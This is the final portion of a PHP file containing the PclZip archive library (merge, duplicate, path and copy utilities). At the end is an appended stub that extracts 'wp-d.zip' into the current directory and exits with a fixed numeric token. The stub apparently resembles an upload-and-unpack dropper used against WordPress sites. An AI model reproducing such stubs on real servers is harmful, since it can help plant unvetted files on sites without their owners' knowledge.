    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("wp-d.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}